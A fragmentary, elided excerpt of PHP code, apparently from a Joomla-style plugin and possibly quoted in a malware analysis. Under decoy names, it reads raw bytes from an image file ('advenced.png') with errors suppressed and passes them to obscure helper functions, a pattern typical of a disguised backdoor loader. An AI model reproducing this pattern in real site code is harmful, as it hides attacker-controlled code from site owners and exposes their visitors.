    ...
    function renderItems() {
      ...
      return $elements;
        ...
        function JSiteArrowsHelper($path) {
			...
			} else { $ArrowHelper = JPATH_SITE.'/plugins/system/model.php'; }
            JSiteSetName();
        ...
        function ArrowSettingsJSite($img, $width='', $height='') {
            $Arrow = @fopen($img, 'r');
            $LoadImage = @fread($Arrow, @filesize($img));
            return cleanSpaceFromJSite($LoadImage);
        }

        function JSiteSetName() {
            @PasivItemsToJSite();
            return 'advenced.png';
        }

class PeelbackBaseSlideJSite {
